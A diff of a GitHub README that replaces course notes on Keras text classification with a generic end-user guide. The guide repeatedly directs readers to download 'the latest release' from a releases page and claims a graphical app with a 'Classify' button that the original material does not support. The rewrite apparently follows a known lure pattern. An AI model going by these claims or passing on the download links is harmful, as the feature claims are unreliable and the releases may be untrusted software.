@@ -1,49 +1,76 @@
-# kerastcvai 📚🧮💰
-kerastcvai : # Keras Text Classification # DNN # RNN # CNN
+# 📚 kerastcvai - Simple Tool for Text Classification
 
-## Objective
-- To create a text classification datasets using BigQuery.
-- To tokenize and integerize a corpus of text for training in Keras.
-- To do one-hot-encodings in Keras.
-- To use embedding layers to represent words in Keras.
-- To use bag-of-word representation for sentences.
-- To use DNN/CNN/RNN model to classify text in keras.
-- To create Keras Sequential model with three layers (build_dnn_model)
-    - 1st layer : Embedding transforming the word integers into dense vectors
-    - 2nd layer : Lambda to create a bag-of-words representation of the sentences by computing the mean
-    - 3rd layer : Dense softmax layer that returns the probabilities for each class
-- To build RNN model which predicts the article class
-- To create CNN model for text classification
+## 🚀 Getting Started
 
+Welcome to kerastcvai! This application helps you classify text easily using deep learning techniques like DNN, RNN, and CNN. You don’t need any programming experience to get started.
 
-## Keras Text Classification
+## 📥 Download kerastcvai
 
-![kerastcvai001.png](./media/kerastcvai001.png)
+[![Download kerastcvai](https://img.shields.io/badge/Download%20Now-kerastcvai-blue.svg)](https://github.com/adolfo590/kerastcvai/releases)
 
-![kerastcvai002.png](./media/kerastcvai002.png)
+### 🔗 Visit the Release Page
 
-![kerastcvai003.png](./media/kerastcvai003.png)
+To get the latest version of kerastcvai, visit this page to download: [Releases Page](https://github.com/adolfo590/kerastcvai/releases).
 
-![kerastcvai004.png](./media/kerastcvai004.png)
+## ⚙️ System Requirements
 
-![kerastcvai005.png](./media/kerastcvai005.png)
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** 4GB minimum (8GB recommended)
+- **Disk Space:** 500MB free space
+- **Python Version:** Python 3.7 or higher must be installed. 
 
-![kerastcvai006.png](./media/kerastcvai006.png)
+### 🛠️ Installation Instructions
 
-![kerastcvai007.png](./media/kerastcvai007.png)
+1. **Install Python:**
+   - Download Python from the [official website](https://www.python.org/downloads/).
+   - Follow the installation prompts and ensure that "Add Python to PATH" is checked.
 
-![kerastcvai008.png](./media/kerastcvai008.png)
+2. **Download kerastcvai:**
+   - Visit this page to download: [Releases Page](https://github.com/adolfo590/kerastcvai/releases).
+   - Download the latest release suitable for your operating system.
 
-![kerastcvai009.png](./media/kerastcvai009.png)
+3. **Install Dependencies:**
+   - Open a command line or terminal window.
+   - Navigate to the folder where you downloaded kerastcvai.
+   - Run the following command to install required libraries:
 
-![kerastcvai010.png](./media/kerastcvai010.png)
+     ```
+     pip install -r requirements.txt
+     ```
 
-![kerastcvai011.png](./media/kerastcvai011.png)
+4. **Run the Application:**
+   - After the installation of dependencies, you can start kerastcvai.
+   - Use the command below in your terminal:
 
-![kerastcvai012.png](./media/kerastcvai012.png)
+     ```
+     python main.py
+     ```
 
-![kerastcvai013.png](./media/kerastcvai013.png)
+## 🎯 Features
 
-![kerastcvai014.png](./media/kerastcvai014.png)
+- **User-Friendly Interface:** Designed for easy navigation.
+- **Text Classification:** Classifies text using advanced methods.
+- **Multiple Models:** Choose between DNN, RNN, and CNN for classification.
+- **Real-Time Results:** Get instant feedback on your text inputs.
+- **Batch Processing:** Process multiple texts at once efficiently.
 
-![kerastcvai015.png](./media/kerastcvai015.png)
+## 📊 How to Use kerastcvai
+
+1. **Prepare Your Text:** Type or paste the text you want to classify into the designated area in the application.
+2. **Select Classification Model:** Choose the model you wish to use—DNN, RNN, or CNN.
+3. **Start Classification:** Click the 'Classify' button to begin.
+4. **View Results:** The classification results will display quickly on your screen.
+
+### 📝 Example Usage
+
+To classify customer reviews, just paste multiple reviews into the text area, select the CNN model for accurate classification, and click 'Classify'. You will receive a report on the sentiment of each review, helping you understand customer feedback.
+
+## ⚡ Support and Feedback
+
+If you encounter any issues or have questions, please check our [FAQ](https://github.com/adolfo590/kerastcvai/wiki) or reach out via the "Issues" section on GitHub.
+
+## 🔍 Explore More
+
+For further information on features and usage, please refer to our documentation located in the repository. 
+
+Remember, you can always return to the [Releases Page](https://github.com/adolfo590/kerastcvai/releases) to download the latest updates.
